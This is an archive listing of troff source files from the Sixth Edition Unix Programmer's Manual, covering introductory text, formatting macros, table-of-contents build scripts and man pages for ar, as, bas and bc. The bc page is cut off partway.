generally causes whatever program
you are running to terminate.
It is typically used to stop a long printout that
you don't want.
However, programs can arrange either to ignore
this signal altogether,
or to be notified when it happens (instead
of being terminated).
The editor, for example, catches interrupts and
stops what it is doing,
instead of terminating, so that an interrupt can
be used to halt an editor printout without
losing the file being edited.
.pg
The \fIquit\fR signal is generated
by typing the \s8ASCII\s10 FS character.
It not only causes a running program to terminate
but also generates a file with the core image
of the terminated process.
Quit is useful
for debugging.
.pg
Besides adapting to the speed of the terminal,
\s8UNIX\s10 tries to be intelligent about whether
you have a terminal with the new-line function
or whether it must be simulated with carriage-return
and line-feed.
In the latter case, all input carriage returns
are turned to new-line characters (the standard
line delimiter)
and both a carriage return and a line feed
are echoed to the terminal.
If you get into the wrong mode, the \fIstty\fR command
(I) will rescue you.
.pg
Tab characters are used freely in \s8UNIX\s10 source programs.
If your terminal does not have the tab function,
you can arrange to have them turned into spaces
during output, and echoed as spaces
during input.
The system assumes
that tabs are set every eight columns.
Again, the \fIstty\fR command (I)
will set or reset this mode.
Also, there is a file which, if printed on \s8TTY\s10 37
or TermiNet 300 terminals, will set the tab stops
correctly (\fItabs\fR (V)).
.pg
Section \fItty\fR (IV) discusses typewriter I/O more fully.
.pg
.ul
How to run a program; the Shell.||
When you have successfully logged into \s8UNIX\s10, a program
called the Shell is listening to your terminal.
The Shell reads typed-in lines, splits them up
into a command name and arguments, and executes the command.
A command is simply an executable program.
The Shell looks first in your current directory
(see next section)
for a program with the given name,
and if none is there, then in a system directory.
There is nothing special about system-provided
commands except that they are kept in a directory
where the Shell can find them.
.pg
The command name is always the first word on an input line;
it and its arguments are separated from one another by
spaces.
.pg
When a program terminates, the Shell will ordinarily regain control and type 
a ``%'' at you to indicate that it is ready for another command.
.pg
The Shell has many other capabilities, which are described in detail in section
\fIsh\fR\|(I).
.pg
.ul
The current directory.||
\s8UNIX\s10 has a file system arranged in a hierarchy of directories.
When the system administrator gave you a user name,
he also created a directory for you (ordinarily
with the same name as your user name).
When you log in, any file
name you type is by default
in this directory.
Since you are the owner of this directory, you have
full permissions to read, write, alter, or destroy
its contents.
Permissions to have your will with other directories
and files will have been granted or denied to you
by their owners.
As a matter of observed fact, few \s8UNIX\s10 users
protect their files from destruction,
let alone perusal, by other users.
.pg
To change the
current directory (but not the set of permissions you
were endowed with at login) use \fIchdir\fR (I).
.pg
.ul
Path names.||
To refer to files not in the current directory, you must
use a path name.
Full path names begin with ``/'', the name of the root directory of the
whole file system.
After the slash comes the name of each directory containing the next
sub-directory (followed by a ``/'') until finally the
file name is reached.
E.g.:
.ul
/\|usr/\|lem/\|filex
refers to the file
.ul
filex
in the directory
.ul
lem; lem
is itself a subdirectory of
.ul
usr; usr
springs directly from the root directory.
.pg
If your current directory has subdirectories,
the path names of files therein begin with
the name of the subdirectory (no prefixed ``/'').
.pg
Without important exception,
a path name may be used anywhere a file name is
required.
.pg
Important commands which modify the contents of files
are \fIcp\fR (I), \fImv\fR (I), and \fIrm\fR (I),
which respectively copy, move (i.e. rename) and remove files.
To find out the status of files or directories, use \fIls\fR (I).
See \fImkdir\fR (I) for making directories; \fIrmdir\fR (I) for destroying them.
.pg
For a fuller discussion of the file system, see
``The \s8UNIX\s10 Time-Sharing System,''
by the present authors.
It may also be useful to glance through
section II of this manual, which discusses
system calls, even if you don't intend
to deal with the system at that level.
.pg
.ul
Writing a program.||
To enter the text of a source program into a \s8UNIX\s10 file, use \fIed\fR (I).
The three principal languages in \s8UNIX\s10 are
assembly language (see \fIas\fR (I)), Fortran (see \fIfc\fR (I)),
and C (see \fIcc\fR (I)).
After the program text has been entered through 
the editor
and written on a file, you can give the file
to the appropriate language processor as an argument.
The output of the language processor
will be left on a file in the current directory named ``a.out''.
(If the output is precious, use \fImv\fR to move it to a less
exposed name soon.)|
If you wrote in assembly language, you will probably
need to load the program with library subroutines; see
\fIld \fR(I).  The other two language processors call
the loader automatically.
.pg
When you have finally gone through this entire process
without provoking any diagnostics, the resulting program
can be run by giving its name to the Shell
in response to the ``%'' prompt.
.pg
Next, you will need \fIcdb\fR (I) or \fIdb\fR (I) to
examine the remains of your program.
The former is useful for C programs, the latter
for assembly-language.
No debugger is much help for Fortran.
.pg
Your programs can receive arguments from the command line
just as system programs do.
See \fIexec\fR (II).
.pg
.ul
Text processing.||
Almost all text is entered through the editor.
The commands most often used to write text on a terminal are:
.ul
cat, pr, roff, nroff,
and
.ul
troff,
all in section I.
.pg
The \fIcat\fR command simply dumps \s8ASCII\s10 text
on the terminal, with no processing at all.
The \fIpr\fR command paginates the text, supplies headings,
and has a facility for multi-column output.
.ul
Troff
and
.ul
nroff
are elaborate text formatting programs,
and require careful forethought
in entering both the text and the formatting commands
into the input file.
.ul
Troff
drives a Graphic Systems phototypesetter;
it was used to produce this manual.
.ul
Nroff
produces output on a typewriter terminal.
.ul
Roff
(I)
is a somewhat less elaborate text formatting
program, and requires somewhat less forethought.
.pg
.ul
Surprises.||
Certain commands provide inter-user communication.
Even if you do not plan to use them, it would be
well to learn something about them, because someone else may
aim them at you.
.pg
To communicate with another user currently logged in,
.ul
write
(I)
is used;
.ul
mail
(I)
will leave a message whose presence will be announced
to another user when he next logs in.
The write-ups in the manual also suggest how to respond to
the two commands if you are a target.
.pg
When you log in, a message-of-the-day may greet you
before the first ``%''.
-- /usr/man/man0/intro mode=0110664 uid=3 gid=3 atime=174846403 mtime=174846403 --
.lg
.ll 6i
.lt 6i
.ps 10
.vs 12p
.de he
.tl '-'''
'sp .5i
'ft R
.CH
'ft
'ps
'sp .5i
..
.de fo
'ft R
'ps 10
'sp .5i
.CF
'ft
'ps
'bp
..
.wh 0 he
.wh -1i fo
.de pg
.sp .5
..
.tr |
.br
.sp 3i
.ps 18
.ft B
.ce
UNIX PROGRAMMER'S MANUAL
.ps 12
.vs 14p
.sp 2
.ft I
.ce
Sixth Edition
.sp 3
.ce 3
K. Thompson
.sp .5
D. M. Ritchie
.sp 2
.ce
May, 1975
.sp 2.5i
.ps 10
.vs 12p
.ft R
.bp
.sp 3i
.sp 3i
.ll 4.7i
.in 1.5i
.ft R
This manual was set
by a Graphic Systems phototypesetter driven
by the \fItroff\fR formatting program operating
under the \s8UNIX\s10 system.
The text of the manual was
prepared using the \fIed\fR text editor.
.br
.ft R
.ll 6i
.in 0
.bp 1
.sp 3
.ce 2
PREFACE
to the Sixth Edition
.sp
.de CF
.ro
.tl ''%''
.ar
..
.sp 2
We are grateful
to L. L. Cherry,
R. C. Haight,
S. C. Johnson,
B. W. Kernighan,
M. E. Lesk,
and
E. N. Pinson
for their
contributions
to the system software,
and to L. E. McMahon for software and for
his contributions to this manual.
We are particularly appreciative of the
invaluable technical, editorial, and administrative
efforts of
J. F. Ossanna, M. D. McIlroy, and R. Morris.
They all contributed greatly to the stock of
\s8UNIX\s10 software and to this manual.
Their inventiveness,
thoughtful criticism,
and ungrudging support
increased immeasurably
not only whatever success the \s8UNIX\s10 system enjoys,
but also our own enjoyment in its creation.
.bp
.sp 2
.ce
INTRODUCTION TO THIS MANUAL
.pg
.pg
This manual gives descriptions of the publicly available
features of \s8UNIX\s10.
It provides neither a general
overview \- see ``The \s8UNIX\s10 Time-sharing System''
(Comm. ACM \fB17\fR 7, July 1974, pp. 365-375)
for that \-
nor details of the implementation of the system, which
remain to be disclosed.
.pg
Within the area it surveys, this manual attempts
to be as complete and timely as possible.
A conscious
decision was made to describe each program
in exactly the state it was in at the time
its manual section
was prepared.
In particular, the
desire to describe something as it should be, not as it is,
was resisted.
Inevitably, this means that
many sections will soon be out of date.
.pg
This manual is divided into
eight sections:
.pg
.nf
	I.	Commands
	II.	System calls
	III.	Subroutines
	IV.	Special files
	V.	File formats and conventions
	VI.	User-maintained programs
	VII.	User-maintained subroutines
	VIII.	Maintenance
.pg
.fi
Commands are programs intended to be invoked directly by
the user, in contradistinction to subroutines, which are
intended to be called by the user's programs.
Commands generally reside in directory
.ft I
/bin
.ft R
(for \fIbin\fR\|ary programs).
Some programs also reside in
.ft I
/\|usr/\|bin,
.ft R
to save space in
\fI/bin.\fR
These directories are searched automatically by the command interpreter.
.pg
System calls are entries into the \s8UNIX\s10 supervisor.
In assembly language, they are coded with the use
of the opcode \fIsys\fR, a synonym for the
\fItrap\fR instruction.
In this edition,
the C language interface routines to the system
calls have been incorporated in section II.
.pg
A small assortment
of subroutines is available;
they are described in section III.
The binary form of most of them is kept in
the system library
\fI/\|lib/\|liba.a.\fR
The subroutines available from C and from Fortran are also included;
they reside in
\fI/\|lib/\|libc.a\fR
and
\fI/\|lib/\|libf.a\fR
respectively.
.pg
The special files section IV discusses the characteristics of
each system ``file'' which actually refers to an I/O device.
The names in this
section refer to the DEC device names for the
hardware,
instead of the names of
the special files themselves.
.pg
The file formats and conventions section V documents the structure of particular
kinds of files; for example, the form of the output of the loader and
assembler is given.  Excluded are files used by only one command,
for example the assembler's intermediate files.
.pg
User-maintained programs and subroutines (sections VI and VII) are not considered part
of the \s8UNIX\s10 system, and the principal reason for
listing them is to indicate their existence without
necessarily giving a complete description.
The authors of the individual programs should be consulted
for more information.
.pg
Section VIII discusses commands which are not intended
for use by the ordinary user,
in some cases because they disclose information
in which he is presumably not interested,
and in others because they perform
privileged functions.
.pg
.pg
Each section consists of a number of independent
entries of a page or so each.
The name of the entry is in the upper corners of its pages,
its preparation date in the upper middle.
Entries within each section are
alphabetized.
The page numbers of each entry start at 1.
(The earlier hope for frequent, partial
updates of the manual is clearly in vain, but
in any event it is not feasible to
maintain consecutive page numbering in a document
like this.)
.pg
All entries are based on a common format,
not all of whose subsections will always appear.
.pg
.in .5i
The \fIname\fR section repeats the entry name and gives
a very short description of its purpose.
.pg
The \fIsynopsis\fR summarizes the use of the
program being described.
A few conventions are used, particularly in the
Commands section:
.pg
.in 1i
\fBBoldface\fR words are considered literals, and
are typed just as they appear.
.pg
Square brackets ( [ ] ) around an argument
indicate that the argument is optional.
When an argument is given as ``name'', it always
refers to a file name.
.pg
Ellipses ``.\|.\|.'' are used to show that the previous argument-prototype
may be repeated.
.pg
A final convention is used by the commands themselves.
An argument beginning with a minus sign ``_''
is often taken to mean some sort of flag argument
even if it appears in a position where a file name
could appear.  Therefore, it is unwise to have files
whose names begin with ``_''.
.pg
.in .5i
The \fIdescription\fR section discusses in detail the subject at hand.
.pg
The \fIfiles\fR section gives the names of files which are
built into the program.
.pg
A
.ft I
see also
.ft R
section gives pointers to related information.
.pg
A \fIdiagnostics\fR
section discusses
the diagnostic indications which may be produced.
Messages which are intended to be self-explanatory
are not listed.
.pg
The \fIbugs\fR section gives
known bugs and sometimes deficiencies.
Occasionally also the suggested fix is
described.
.pg
.in 0
At the beginning of this document is a table of contents,
organized by section and alphabetically within each section.
There is also a permuted index derived from the table of contents.
Within each index entry, the title
of the writeup to which
it refers is followed by the appropriate section number in parentheses.
This fact is important because there is considerable
name duplication among the sections,
arising principally from commands which
exist only to exercise a particular system call.
.pg
.pg
This manual was prepared using the \s8UNIX\s10 text
editor \fIed\fR and the formatting program \fItroff\fR.
-- /usr/man/man0/kaa mode=0100664 uid=3 gid=3 atime=174846304 mtime=173059717 --
.nr in .5i
.de i0
.in \n(inu
..
.de lp
.tc 
.tr 
.i0
.ta \\$2/2u
.in \\$1/2u
.ti -\\$2/2u
..
.de s1
.sp .10i
.ne 2
..
.de s2
.sp .07i
..
.de s3
.sp .07i
.ne 2
..
.de fo
'ft R
'ps 10
'sp .50i
'tl ''- % -''
'ft
'ps
'bp
..
.de th
.de x1
.tl '-'''
'ft R
'ps 10
'sp .50i
'tl '\\$1\|(\|\\$2\|)'\\$3'\\$1\|(\|\\$2\|)'
'ft
'ps
'sp .50i
\\..
.wh -1i fo
.wh 0 x1
.ft R
.ps 10
.vs 11p
.in \n(inu
..
.wh 0 x1
.de sh
.s1
.ft B
.ps 8
.ti 0
\\$1
.ft
.ps
.br
..
.de it
'ft I
'li
\\$1
'ft
..
.de bd
'ft B
\\$1
'ft R
..
.de bn
'ft B
\\$1	\\fR\\
..
.ds b \(*b
.ds _ \(ul
.ds - \(mi
.ds a \(aa
.ds v \(vb
.ds p \(*p
.ds r \(rg
.ds g \(ga
.ds | \|
.ds X \(mu
.ds u \(*m
.ds G \(*G
.ds > \(->
.de dt
.ta .5i 1i 1.5i 2i 2.5i 3i 3.5i 4i 4.5i 6i
..
.lg 0
-- /usr/man/man0/naa mode=0100664 uid=3 gid=3 atime=174846304 mtime=173059717 --
.nr in 5
.de i0
.in \n(in
..
.de lp
.i0
.ta \\$2+1
.in \\$1
.ti -\\$2
..
.de s1
.sp 1
.ne 4
..
.de s2
.sp 1
..
.de s3
.sp 1
..
.de fo
'sp 2
'tl ''- % -''
'bp
..
.de th
.de x1
'sp 2
'tl '\\$1(\\$2)'\\$3'\\$1(\\$2)'
'sp 2
\\..
.wh -5  fo
.wh 0 x1
.in \n(in
..
.de sh
.s1
.ne 5
.ti 0
\\$1
.br
..
.de bd
.tr __
.ul
\\$1
..
.de bn
.tr __
.ul
\\$1\\t
..
.de it
.tr __
.ul
.li
\\$1
..
.de dt
.ta 8 16 24 32 40 48 56 64
..
.ds b B
.ds G G
.ds a '
.ds - -
.ds _ _
.ds v |
.ds p J
.ds r
.ds g `
.ds X X
.ds u u
.ds > ->
.ds | 
-- /usr/man/man0/ptx mode=0100664 uid=3 gid=3 atime=174846304 mtime=173059717 --
.nf
.bp
.ce
PERMUTED INDEX
.sp 1.5
.nf
.de xx
\\h"3i-\\w'\\$1'u"\\$1   \\$2
..
.so ptxx
-- /usr/man/man0/taa mode=0100664 uid=3 gid=3 atime=174846304 mtime=173059717 --
.nr in .5i
.de i0
.in \n(inu
..
.de lp
.tc 
.tr 
.i0
.ta \\$2/2u
.in \\$1/2u
.ti -\\$2/2u
..
.de s1
.sp .10i
.ne 2
..
.de s2
.sp .07i
..
.de s3
.sp .07i
.ne 2
..
.de fo
'ft R
'ps 10
'sp .50i
'tl ''- % -''
'ft
'ps
'bp
..
.de th
.de x1
.tl '-'''
'ft R
'ps 10
'sp .50i
'tl '\\$1\|(\|\\$2\|)'\\$3'\\$1\|(\|\\$2\|)'
'ft
'ps
'sp .50i
\\..
.wh -1i fo
.wh 0 x1
.ft R
.ps 10
.vs 11p
.in \n(inu
..
.wh 0 x1
.de sh
.s1
.ft B
.ps 8
.ti 0
\\$1
.ft
.ps
.br
..
.de it
'ft I
'li
\\$1
'ft
..
.de bd
'ft B
\\$1
'ft R
..
.de bn
'ft B
\\$1	\\fR\\
..
.ds b \(*b
.ds _ \(ul
.ds - \(mi
.ds a \(aa
.ds v \(vb
.ds p \(*p
.ds r \(rg
.ds g \(ga
.ds | \|
.ds X \(mu
.ds u \(*m
.ds G \(*G
.ds > \(->
.de dt
.ta .5i 1i 1.5i 2i 2.5i 3i 3.5i 4i 4.5i 6i
..
.lg
-- /usr/man/man0/toc mode=0100664 uid=3 gid=3 atime=174846305 mtime=173059717 --
.bp
.nf
.in +1i
.ce
TABLE OF CONTENTS
.sp 1.5
.ne .5i
.nr x 36u
.cs B \nx
.nr x \nxm/36u
.tc .
.de xx
.nr y \\w'\\$2'u/\\nxu*\\nxu+\\nxu
.ta 4.7i-\\nyu
\\$1\fB \t \fR\\h"\\nyu-\\w'\\$2'u"\\$2
..
I. COMMANDS
.sp .5
.so toc1
.sp 1.5
.ne .5i
II. SYSTEM CALLS
.sp .5
.so toc2
.sp 1.5
.ne .5i
III. SUBROUTINES
.sp .5
.so toc3
.sp 1.5
.ne .5i
IV. SPECIAL FILES
.sp .5
.so toc4
.sp 1.5
.ne .5i
V. FILE FORMATS AND CONVENTIONS
.sp .5
.so toc5
.sp 1.5
.ne .5i
VI. USER MAINTAINED PROGRAMS
.sp .5
.so toc6
.sp 1.5
.ne .5i
VII. USER MAINTAINED SUBROUTINES
.sp .5
.so toc7
.sp 1.5
.ne .5i
VIII. SYSTEM MAINTENANCE
.sp .5
.so toc8
.in -1i
-- /usr/man/man0/tocrc mode=0100664 uid=3 gid=3 atime=174846305 mtime=173059717 --
if $2x != x goto both
goto $1x
: allx
sh $0 1 I
sh $0 2 II
sh $0 3 III
sh $0 4 IV
sh $0 5 V
sh $0 6 VI
sh $0 7 VII
sh $0 8 VIII
: tx
cat tocx? >cattoc
ptx -t cattoc ptxx
rm cattoc
ed - tocx1
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc1
e tocx2
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc2
e tocx3
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc3
e tocx4
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc4
e tocx5
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc5
e tocx6
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc6
e tocx7
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc7
e tocx8
1,$s/([IV]*) /" "/
1,$s/.*/.xx "&"/
w toc8
q
exit
: 1x
sh $0 1 I
exit
: 2x
sh $0 2 II
exit
: 3x
sh $0 3 III
exit
: 4x
sh $0 4 IV
exit
: 5x
sh $0 5 V
exit
: 6x
sh $0 6 VI
exit
: 7x
sh $0 7 VII
exit
: 8x
sh $0 8 VIII
exit
: x
echo usage: sh tocrc "[12345678]"
exit
: both
chdir /usr/man/man$1
ls >xa
ed - xa
v/\.[12345678]$/d
g/intro.2/d
g/^/s//e /\
.a\
/NAME/1p
w
q
ed - <xa >xb
echo "1,$s/ *\\\*- */("$2") /" >xa
if $1 != 2 goto 1f
echo 0a >>xa
echo "intro(II) introduction to system calls" >>xa
echo . >>xa
: 1f
echo w /usr/man/man0/tocx$1 >>xa
ed - xb <xa
rm xa xb
-- /usr/man/man0/xx mode=0100664 uid=3 gid=3 atime=174846305 mtime=173059717 --
.th name section date
.sh NAME
.sh SYNOPSIS
.sh DESCRIPTION
.sh FILES
.sh "SEE ALSO"
.sh DIAGNOSTICS
.sh BUGS
-- /usr/man/man1 mode=0140775 uid=3 gid=3 atime=173061355 mtime=173059709 --
-- /usr/man/man1/ar.1 mode=0100664 uid=3 gid=3 atime=170022100 mtime=173061341 --
.th AR I 3/15/72
.sh NAME
ar \*- archive and library maintainer
.sh SYNOPSIS
.bd ar
key afile name ...
.sh DESCRIPTION
.it Ar
maintains groups of files
combined into a single archive file.
Its main use
is to create and update library files as used by the loader.
It can be used, though, for any similar purpose.
.s3
.it Key
is one character from the set
.bd drtux,
optionally concatenated with
.bd v.
.it Afile
is the archive file.
The
.it names
are constituent files in the archive file.
The meanings of the
.it key
characters are:
.s3
.bd d
means delete the named files from the archive file.
.s3
.bd r
means replace the named files in the archive file.
If the archive file does not exist,
.bd r
creates it.
If the named files are not in the archive file, they are appended.
.s3
.bd t
prints a table of contents of the archive file.
If no names are given, all files in the archive are tabled.
If names are given, only those files are tabled.
.s3
.bd u
is similar to
.bd r
except that only those
files that have been modified are replaced.
If no names are given, all files in the archive that
have been modified are replaced by the modified version.
.s3
.bd x
extracts the named files.
If no names are given, all files in the archive are
extracted.
In neither case does
.bd x
alter the archive file.
.s3
.bd v
means verbose.
Under the verbose option,
.it ar
gives a file-by-file
description of the making of a
new archive file from the old archive and the constituent files.
The following abbreviations
are used:
.s3
.bd "   c"
copy
.bd "   a"
append
.bd "   d"
delete
.bd "   r"
replace
.bd "   x"
extract
.sh FILES
/tmp/vtm?	temporary
.sh "SEE ALSO"
ld (I), archive (V)
.sh BUGS
Option
.bd tv
should be implemented as a table with more information.
.s3
There should be a way to specify the placement
of a new file in an archive.
Currently, it is placed at the end.
.s3
Since
.it ar
has not been rewritten to
deal properly with the new file system
modes,
extracted files have mode 666.
.s3
For the same reason,
only the first 8 characters of file names are significant.
.s3
If the same file is mentioned twice in an argument list,
it may be put in the archive twice.
-- /usr/man/man1/as.1 mode=0100664 uid=3 gid=3 atime=170022103 mtime=173061341 --
.th AS I 1/15/73
.sh NAME
as \*- assembler
.sh SYNOPSIS
.bd as
[
.bd \*-
] name ...
.sh DESCRIPTION
.it As
assembles the concatenation of the named files.
If the optional first argument
.bd \*-
is used,
all undefined symbols in the assembly
are treated as global.
.s3
The output of the assembly is left on the file
.bd "a.out."
It is executable if no errors occurred
during the assembly,
and if there were no unresolved external references.
.sh FILES
/lib/as2   	pass 2 of the assembler
.br
/tmp/atm[1-3]?	temporary
.br
a.out		object
.sh "SEE ALSO"
ld (I),
nm (I),
db (I),
a.out (V),
`UNIX Assembler Manual'.
.sh DIAGNOSTICS
When
an input file cannot be read, its name
followed by a question mark is typed and assembly
ceases.
When syntactic or semantic errors occur, a single-character diagnostic is typed out
together with the line number and the file name in which it
occurred.
Errors in pass 1 cause cancellation of pass 2.
The possible errors are:
.s3
.ta 3
)	Parentheses error
.br
]	Parentheses error
.br
<	String not terminated properly
.br
*	Indirection used illegally
.br
.li
\fB.\fR	Illegal assignment to `\fB.\fR'
.br
A	Error in address
.br
B	Branch instruction is odd or too remote
.br
E	Error in expression
.br
F	Error in local (`f' or `b') type symbol
.br
G	Garbage (unknown) character
.br
I	End of file inside an if
.br
M	Multiply defined symbol as label
.br
O	Word quantity assembled at odd address
.br
P	`\fB.\fR' different in pass 1 and 2
.br
R	Relocation error
.br
U	Undefined symbol
.br
X	Syntax error
.br
.sh BUGS
Symbol table overflow is not checked.
\fBx\fR errors can cause incorrect line numbers
in following diagnostics.
-- /usr/man/man1/bas.1 mode=0110664 uid=3 gid=3 atime=170022105 mtime=173061341 --
.th BAS I 5/15/74
.sh NAME
bas \*- basic
.sh SYNOPSIS
.bd bas
[ file ]
.sh DESCRIPTION
.it Bas
is a dialect of Basic.
If a file argument is provided,
the file is used for input before the console
is read.
.it Bas
accepts lines of the form:
.s3
   statement
   integer statement
.s3
Integer numbered statements
(known as internal statements)
are stored for later execution.
They are stored in sorted ascending order.
Non-numbered statements are immediately executed.
The result of an immediate expression statement
(that does not have `=' as its highest operator) is printed.
.s3
Statements have the following syntax:
.s3
.lp +5 5
expression
.br
The expression is executed for its side
effects (assignment or function call)
or for printing as described above.
.s3
.lp +5 5
.bd comment
.li
...
.br
This statement is ignored.
It is used to interject commentary in a program.
.s3
.lp +5 5
.bd done
.br
Return to system level.
.s3
.lp +5 5
.bd draw
expression expression expression
.br
A line is drawn on the Tektronix 611 display
`/dev/vt0'
from
the current display position
to the XY co-ordinates specified by the
first two expressions.
The scale is zero to one in both X and Y directions.
If the third expression
is zero, the line is invisible.
The current display position is set to the end point.
.s3
.lp +5 5
.bd display
list
.br
The list of expressions and strings is
concatenated and displayed (i.e. printed) on the 611 starting
at the current display position.
The current display position is not changed.
.s3
.lp +5 5
.bd dump
.br
The name and current value of every
variable is printed.
.s3
.lp +5 5
.bd edit
.br
The UNIX editor,
.it ed,
is invoked with the
.it file
argument.
After the editor exits,
this file is recompiled.
.s3
.lp +5 5
.bd erase
.br
The 611 screen is erased.
.s3
.lp +5 5
.bd for
name
.bd =
expression expression statement
.br
.lp +5 5
.bd for
name
.bd =
expression expression
.br
.li
...
.lp +5 5
.bd next
.br
The
.it for
statement
repetitively executes a
statement (first form)
or a group of statements (second form)
under control of a named variable.
The variable takes on the value of
the first expression,
then is incremented by one on each loop,
not to exceed the value of
the second expression.
.s3
.lp +5 5
.bd goto
expression
.br
The expression is evaluated, truncated to an integer
and execution goes to the corresponding integer numbered statment.
If executed from immediate mode,
the internal statements are compiled first.
.s3
.lp +5 5
.bd if
expression statement
.br
.lp +5 5
.bd if
expression
.br
.li
...
.lp +5 5
[
.bd else
.br
.li
... ]
.lp +5 5
.bd fi
.br
The statement (first form)
or group of statements (second form)
is executed if the expression evaluates
to non-zero.
In the second form,
an optional
.bd else
allows for a group of statements to be
executed when the first group is not.
.s3
.lp +5 5
.bd list
[expression [expression]]
.br
.br list
is used to print out the stored internal statements.
If no arguments are given, all internal statements are printed.
If one argument is given, only that
internal statement is listed.
If two arguments are given, all internal statements
inclusively between the arguments are printed.
.s3
.lp +5 5
.bd print
list
.br
The list of expressions and strings are concatenated and
printed.
(A string is delimited by " characters.)
.s3
.lp +5 5
.bd prompt
list
.br
.it Prompt 
is the same as
.it print
except that no newline character is
printed.
.s3
.lp +5 5
.bd return
[expression]
.br
The expression is evaluated and the result is passed
back as the value of a function call.
If no expression is given, zero is returned.
.s3
.lp +5 5
.bd run
.br
The internal statements are compiled.
The symbol table is re-initialized.
The random number generator is reset.
Control is passed to the lowest numbered internal
statement.
.s3
.lp +5 5
.bd save
[expression [expression]]
.br
.it Save
is like
.it list
except that the output
is written on the
.it file
argument.
If no argument is given on the command,
.bd b.out
is used.
.s3
.i0
Expressions have the following syntax:
.s3
.lp +5 5
name
.br
A name is used to specify a variable.
Names are composed of a letter
followed by letters and digits.
The first four characters of a name are significant.
.s3
.lp +5 5
number
.br
A number is used to represent a constant value.
A number is written in Fortran style,
and contains digits, an optional decimal point,
and possibly a scale factor consisting
of an
.bd e
followed by a possibly signed exponent.
.s3
.lp +5 5
.bd (
expression
.bd )
.br
Parentheses are used to alter normal order of evaluation.
.s3
.lp +5 5
\*_ expression
.br
The result is the negation of the expression.
.s3
.lp +5 5
expression operator expression
.br
Common functions of two arguments are abbreviated
by the two arguments separated by an operator denoting the function.
A complete list of operators is given below.
.s3
.lp +5 5
expression
.bd (
[expression [
.bd ,
expression] ... ]
.bd )
.br
Functions of an arbitrary number of arguments
can be called by an expression followed by the arguments
in parentheses separated by commas.
The expression evaluates to the
line number of the entry of the function in the
internally stored statements.
This causes the internal statements to be compiled.
If the expression evaluates negative,
a builtin function is called.
The list of builtin functions appears below.
.s3
.lp +5 5
name
.bd [
expression
[
.bd ,
expression
] ...
.bd ]
.br
Each expression is truncated to an integer
and used as a specifier for the name.
The result is syntactically identical to a name.
.bd a[1,2]
is the same as
.bd a[1][2].
The truncated expressions are restricted to 
values between 0 and 32767.
.s3
.i0
The following is the list of operators:
.s3
.lp +5 5
=
.br
=
is the assignment operator.
The left operand must be a name or an array element.
The result is the right operand.
Assignment binds right to left,
all other operators bind left to right.
.s3
.lp +5 5
&  |
.br
&
(logical and)
has result zero if either of its arguments are zero.
It has result one if both its arguments are non-zero.
|
(logical or)
has result zero if both of its arguments are zero.
It has result one if either of its arguments are non-zero.
.s3
.lp +5 5
<  <=  >  >=  ==  <>
.br
The relational operators
(< less than, <= less than or equal,
> greater than,
>= greater than or equal,
== equal to,
<> not equal to)
return one if their arguments are in the specified
relation.
They return zero otherwise.
Relational operators at the same level extend as follows:
a>b>c is the same as a>b&b>c.
.s3
.lp +5 5
+ \*-
.br
Add and subtract.
.s3
.lp +5 5
* /
.br
Multiply and divide.
.s3
.lp +5 5
^
.br
Exponentiation.
.s3
.i0
The following is a list of builtin functions:
.s3
.lp +5 5
.bd arg(i)
.br
is the value of the
\fIi\fR -th
actual parameter on the current level
of function call.
.s3
.lp +5 5
.bd exp(x)
.br
is the exponential function of \fIx\fR.
.s3
.lp +5 5
.bd log(x)
.br
is the natural logarithm of \fIx\fR.
.s3
.lp +5 5
.bd sqr(x)
.br
is the square root of \fIx\fR.
.s3
.lp +5 5
.bd sin(x)
.br
is the sine of \fIx\fR (radians).
.s3
.lp +5 5
.bd cos(x)
.br
is the cosine of \fIx\fR (radians).
.s3
.lp +5 5
.bd atn(x)
.br
is the arctangent of \fIx\fR.  Its value
is between \*-\(*p/2 and \(*p/2.
.s3
.lp +5 5
.bd "rnd( )"
.br
is a uniformly distributed random
number between zero and one.
.s3
.lp +5 5
.bd "expr( )"
.br
is the only form of program input.
A line is read from the input and
evaluated as an expression.
The resultant value is returned.
.s3
.lp +5 5
.bd abs(x)
.br
is the absolute value of \fIx\fR.
.s3
.lp +5 5
.bd int(x)
.br
returns \fIx\fR truncated (towards 0) to an integer.
.i0
.sh FILES
.dt
/tmp/btm?	temporary
.br
b.out		save file
.sh DIAGNOSTICS
Syntax
errors cause the incorrect line to be typed
with an underscore where the parse failed.
All other diagnostics are self explanatory.
.sh BUGS
Has been known to give core images.
-- /usr/man/man1/bc.1 mode=0100664 uid=3 gid=3 atime=170022107 mtime=173061341 --
.th BC I 2/20/75
.sh NAME
bc \*- arbitrary precision interactive language
.sh SYNOPSIS
.bd bc
[
.bd \-l
] [ file ... ]
.sh DESCRIPTION
.it Bc
is an interactive processor for a language which resembles
C but provides unlimited precision arithmetic.
It takes input from any files given, then reads
the standard input.
The `\-l' argument stands for the name
of a library of mathematical subroutines
which contains sine (named `s'), cosine (`c'),
arctangent (`a'), natural logarithm (`l'),
and exponential (`e').
The syntax for 
.it bc
programs is as follows;
E means expression, S means statement.
.s3
.lp +6 6
Comments
.br
are enclosed in /* and */.
.s3
.lp +6 6
Names
.br
letters a\-z
.br
array elements: letter[E]
.br
The words `ibase', `obase', and `scale'
.s3
.lp +6 6
Other operands
.br
arbitrarily long numbers with optional sign and decimal point.
.br
( E )
.br
sqrt ( E )
.br
<letter> ( E , ... , E )
.s3
.lp +6 6
Operators
.br
+  \-  *  /  %  ^
.br
++   \-\-         (prefix and postfix; apply to names)
.br
==  <=  >=  !=  <  >
.br
=  =+  =\-  =*  =/  =%  =^
.br
.s3
.lp +6 6
Statements
.br
E
.br
{ S ; ... ; S }
.br
if ( E ) S
.br
while ( E ) S
.br
for ( E ; E ; E ) S
.br
null statement
.br
break
.br
quit
.s3
.lp +6 6
Function definitions are exemplified by
.br
define <letter> ( <letter> ,..., <letter> ) {
.br
	auto <letter>, ... , <letter>
.br
	S; ... S
.br
	return ( E )
.br
}
.s3
.i0
.dt
All function arguments are passed by value.
.s3
The value of a statement that is an expression is printed
unless the main operator is an assignment.
Either semicolons or newlines may separate statements.
Assignment to
.it scale
influences the number of digits to be retained on arithmetic
operations.
Assignments to
.it ibase
or
.it obase
set the input and output number radix respectively.
.s3
